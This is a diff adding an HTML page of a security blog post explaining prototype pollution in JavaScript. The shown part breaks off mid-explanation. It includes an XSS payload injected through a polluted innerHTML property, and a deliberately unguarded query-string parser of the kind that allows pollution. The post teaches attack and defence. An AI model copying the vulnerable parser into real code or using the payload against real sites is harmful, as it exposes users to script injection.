@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>Prototype Pollution: An Attack Technique Based on JS Prototype Chain - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2021/09/29/prototype-pollution/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2021/09/29/en/prototype-pollution/">
+    
+
+
+
+
+
+    <meta name="description" content="Introduction As a front-end engineer or someone who knows JavaScript, you must have heard of the term “prototype” and may even have encountered related questions during interviews.  However, you may n">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Prototype Pollution: An Attack Technique Based on JS Prototype Chain">
+<meta property="og:url" content="https://blog.huli.tw/2021/09/29/en/prototype-pollution/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="Introduction As a front-end engineer or someone who knows JavaScript, you must have heard of the term “prototype” and may even have encountered related questions during interviews.  However, you may n">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/prototype-pollution/cover-en.png">
+<meta property="article:published_time" content="2021-09-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-06-20T05:46:56.926Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Front-end">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/prototype-pollution/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Prototype Pollution: An Attack Technique Based on JS Prototype Chain" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#introduction">1&nbsp;&nbsp;<b>Introduction</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#prototype-chain">2&nbsp;&nbsp;<b>Prototype Chain</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#changing-properties-on-the-default-prototype">3&nbsp;&nbsp;<b>Changing Properties on the Default Prototype</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#what-can-be-done-after-polluting-properties">4&nbsp;&nbsp;<b>What can be done after polluting properties?</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#how-does-prototype-pollution-occur">5&nbsp;&nbsp;<b>How does prototype pollution occur?</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#prototype-pollution-script-gadgets">6&nbsp;&nbsp;<b>Prototype pollution script gadgets</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#summary">7&nbsp;&nbsp;<b>Summary</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#how-to-defend">8&nbsp;&nbsp;<b>How to defend</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#real-world-examples">9&nbsp;&nbsp;<b>Real-world examples</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#conclusion">10&nbsp;&nbsp;<b>Conclusion</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2021/09/29/prototype-pollution/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Prototype Pollution: An Attack Technique Based on JS Prototype Chain
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2021-09-28T16:00:00.000Z" itemprop="datePublished">29 September 2021</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <h2><span id="introduction">Introduction</span></h2><!-- summary -->
+<p>As a front-end engineer or someone who knows JavaScript, you must have heard of the term “prototype” and may even have encountered related questions during interviews. </p>
+<p>However, you may not have heard of a type of attack technique closely related to the prototype chain in JavaScript, which utilizes the characteristics of the prototype chain to carry out attacks - Prototype Pollution. This is an interesting and powerful attack technique.</p>
+<!-- summary -->
+
+<span id="more"></span>
+
+
+<h2><span id="prototype-chain">Prototype Chain</span></h2><p>Object-oriented programming in JavaScript is different from other programming languages. The <code>class</code> you see now is a syntax introduced after ES6. Before that, <code>prototype</code> was used to achieve the same purpose, also known as prototype inheritance.</p>
+<p>For example, have you ever wondered where the built-in functions come from when you use them?</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">"a"</span>
+<span class="token keyword">var</span> str2 <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment">// Where does the "repeat" come from?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>You may even find that the <code>repeat</code> method of two different strings is actually the same function:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">"a"</span>
+<span class="token keyword">var</span> str2 <span class="token operator">=</span> <span class="token string">"b"</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>repeat <span class="token operator">===</span> str2<span class="token punctuation">.</span>repeat<span class="token punctuation">)</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Or if you have ever checked MDN, you will find that the title is not “repeat”, but <code>String.prototype.repeat</code>:</p>
+<p><img src="/img/prototype-pollution/1-repeat.png" alt="string.prototype.repeat"></p>
+<p>And all of this is related to the prototype.</p>
+<p>When you call <code>str.repeat</code>, there is not really a method called <code>repeat</code> on the <code>str</code> instance. Then how does the JS engine work?</p>
+<p>Do you remember the concept of scope? If I use a variable and it cannot be found in the local scope, the JS engine will go to the upper scope to find it, and then keep going up the scope chain until it reaches the global scope. This is also called the scope chain. The JS engine continuously searches along this chain until it stops at the top.</p>
+<p>The concept of the prototype chain is exactly the same, but the difference is: “How does the JS engine know where the upper layer is?” If the JS engine cannot find the <code>repeat</code> function on <code>str</code>, where should it look?</p>
+<p>In JS, there is a hidden property called <code>__proto__</code>, and the value it stores is where the JS engine should look up. </p>
+<p>For example:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">""</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span> <span class="token comment">// String.prototype</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>What <code>str.__proto__</code> points to is the “upper layer” where the JS engine should go when it cannot find anything on <code>str</code>. This upper layer will be <code>String.prototype</code>.</p>
+<p>This explains why MDN does not write <code>repeat</code>, but writes <code>String.prototype.repeat</code>, because this is the full name of the <code>repeat</code> function. This <code>repeat</code> function is actually a method on the <code>String.prototype</code> object.</p>
+<p>Therefore, when you call <code>str.repeat</code>, you are actually calling <code>String.prototype.repeat</code>, and this is the principle and operation mode of the prototype chain.</p>
+<p>Other things are the same as strings, such as objects:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// undefined</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>toString<span class="token punctuation">)</span> <span class="token comment">// ƒ toString() &#123; [native code] &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Although <code>obj</code> is an empty object, why does <code>obj.toString</code> exist? Because the JS engine cannot find it on <code>obj</code>, it goes to <code>obj.__proto__</code> to find it, and <code>obj.__proto__</code> points to <code>Object.prototype</code>. Therefore, what <code>obj.toString</code> finally finds is actually <code>Object.prototype.toString</code>.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>toString <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">)</span> <span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2><span id="changing-properties-on-the-default-prototype">Changing Properties on the Default Prototype</span></h2><p>The <code>__proto__</code> of a string is <code>String.prototype</code>, the <code>__proto__</code> of a number is <code>Number.prototype</code>, and the <code>__proto__</code> of an array is <code>Array.prototype</code>. These associations are already pre-set to allow these class objects to share the same function.</p>
+<p>If each string has its own <code>repeat</code>, then there will be one million different repeats for one million strings, but they actually do the same thing, which doesn’t sound reasonable, right? Therefore, through the prototype, we can put <code>repeat</code> in <code>String.prototype</code>, so that every string that uses this function will call the same function.</p>
+<p>You may wonder, since the same function is called with the same parameters, how can the function distinguish which string is calling it?</p>
+<p>The answer is: this, let’s take an example below:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">first</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+<span class="token punctuation">&#125;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// undefined</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>First, I added a method called <code>first</code> on <code>String.prototype</code>, so when I call <code>&quot;&quot;.first</code>, the JS engine finds <code>String.prototype</code> along <code>__proto__</code>, finds that <code>String.prototype.first</code> exists, and calls this function.</p>
+<p>And because of the rules of this, when <code>&quot;&quot;.first()</code> is written, the this obtained in <code>first</code> will be <code>&quot;&quot;</code>; if <code>&quot;abc&quot;.first()</code> is called, the this obtained in <code>first</code> will be <code>&quot;abc&quot;</code>, so we can use this to distinguish who is calling now.</p>
+<p>The way <code>String.prototype.first</code> is written above is to directly modify the prototype of String, add a new method, and let all strings use this new method. Although it is very convenient, this method is not recommended in development. There is a saying: <a target="_blank" rel="noopener" href="https://humanwhocodes.com/blog/2010/03/02/maintainable-javascript-dont-modify-objects-you-down-own/">Don’t modify objects you don’t own</a>. For example, MooTools did something similar, which caused an array method to be renamed. For details, please see what I wrote before: <a href="https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/">Don’t break the Web: SmooshGate and <keygen></a>.</p>
+<p>Then, since <code>String.prototype</code> can be modified, it is natural that <code>Object.prototype</code> can also be modified, like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">123</span>
+<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Because <code>Object.prototype</code> is modified, when accessing <code>obj.a</code>, the JS engine cannot find the property a on obj, so it goes to <code>obj.__proto__</code>, which is <code>Object.prototype</code>, finds a on it, and returns the value of a.</p>
+<p>When the program has vulnerabilities that can be used by attackers to change properties on the prototype chain, it is called prototype pollution. Pollution means pollution. Like the example of the object above, we “polluted” the property <code>a</code> on the object prototype through <code>Object.prototype.a = 123</code>, causing unexpected behavior when accessing the object.</p>
+<p>What are the consequences of this?</p>
+<h2><span id="what-can-be-done-after-polluting-properties">What can be done after polluting properties?</span></h2><p>Suppose there is a search function on the website that will take the value of <code>q</code> from the query string, and write it to the screen, as shown below:</p>
+<p><img src="/img/prototype-pollution/2-search.png" alt="search"></p>
+<p>And the entire code is written like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 從網址列上拿到 query string</span>
+<span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">// 放上畫面，為了避免 XSS 用 innerText</span>
+document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">tag</span><span class="token operator">:</span> <span class="token string">'h2'</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">innerText</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Search result for </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>qs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">// 簡化建立元件用的函式</span>
+<span class="token keyword">function</span> <span class="token function">createElement</span><span class="token punctuation">(</span><span class="token parameter">config</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>tag<span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    element<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> config<span class="token punctuation">.</span>innerHTML
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> config<span class="token punctuation">.</span>innerText
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> element
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>There should be no problem with the above code, right? We wrote a function <code>createElement</code> to simplify some steps for us, and decided what components to generate based on the config passed in. In order to avoid XSS, we use <code>innerText</code> instead of <code>innerHTML</code>, which is foolproof and absolutely no XSS!</p>
+<p>It looks like this, but if there is a prototype pollution vulnerability before executing this code, which allows attackers to pollute properties on the prototype, what will happen? For example, like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 先假設可以污染原型上的屬性</span>
+<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;img src=x onerror=alert(1)>'</span>
+
+<span class="token comment">// 底下都跟剛剛一樣</span>
+<span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">tag</span><span class="token operator">:</span> <span class="token string">'h2'</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">innerText</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Search result for </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>qs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">function</span> <span class="token function">createElement</span><span class="token punctuation">(</span><span class="token parameter">config</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>tag<span class="token punctuation">)</span>
+  <span class="token comment">// 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    element<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> config<span class="token punctuation">.</span>innerHTML
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> config<span class="token punctuation">.</span>innerText
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> element
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The entire code only differs in the beginning, with an additional <code>Object.prototype.innerHTML = &#39;&lt;img src=x onerror=alert(1)&gt;&#39;</code>, and just because this line polluted innerHTML, the judgment of <code>if (config.innerHTML) &#123;</code> below becomes true, the behavior is changed, and it was originally <code>innerText</code>, now it is changed to <code>innerHTML</code>, and finally XSS is achieved!</p>
+<p>This is an XSS attack caused by prototype pollution. Generally speaking, prototype pollution refers to vulnerabilities in the program that allow attackers to contaminate properties on the prototype chain. However, in addition to contamination, it is also necessary to find places that can be affected in order to form a complete attack.</p>
+<p>At this point, you may be curious about what kind of code has vulnerabilities that allow attackers to modify properties on the prototype chain.</p>
+<h2><span id="how-does-prototype-pollution-occur">How does prototype pollution occur?</span></h2><p>There are two common examples of this happening. The first is parsing the query string.</p>
+<p>You might think that the query string is just the type <code>?a=1&amp;b=2</code>, what’s so difficult about it? But in fact, many query string libraries support arrays, such as <code>?a=1&amp;a=2</code> or <code>?a[]=1&amp;a[]=2</code>, which can be parsed as arrays.</p>
+<p>In addition to arrays, some even support objects, like this: <code>?a[b][c]=1</code>, which will produce an object <code>&#123;a: &#123;b: &#123;c: 1&#125;&#125;&#125;</code>.</p>
+<p>For example, the <a target="_blank" rel="noopener" href="https://github.com/ljharb/qs#parsing-objects">qs</a> library supports object parsing.</p>
+<p>If you were responsible for this feature today, how would you write it? We can write a simple version that only targets objects (without considering URL encoding or arrays):</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">parseQs</span><span class="token punctuation">(</span><span class="token parameter">qs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+  <span class="token keyword">let</span> arr <span class="token operator">=</span> qs<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span>
+  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token operator">=</span> item<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>key<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token comment">// 針對一般的 key=value</span>
+      result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
+      <span class="token keyword">continue</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// 針對物件</span>
+    <span class="token keyword">let</span> items <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span>
+    <span class="token keyword">let</span> obj <span class="token operator">=</span> result
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> items<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">let</span> objKey <span class="token operator">=</span> items<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">]$</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> items<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span> <span class="token operator">=</span> value
+      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        obj <span class="token operator">=</span> obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> result
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token function">parseQs</span><span class="token punctuation">(</span><span class="token string">'test=1&amp;a[b][c]=2'</span><span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>qs<span class="token punctuation">)</span>
+<span class="token comment">// &#123; test: '1', a: &#123; b: &#123; c: '2' &#125; &#125; &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Basically, it constructs an object based on the content inside <code>[]</code>, and assigns values layer by layer, which doesn’t look particularly special.</p>
+<p>But! If my query string looks like this, things are different:</p>
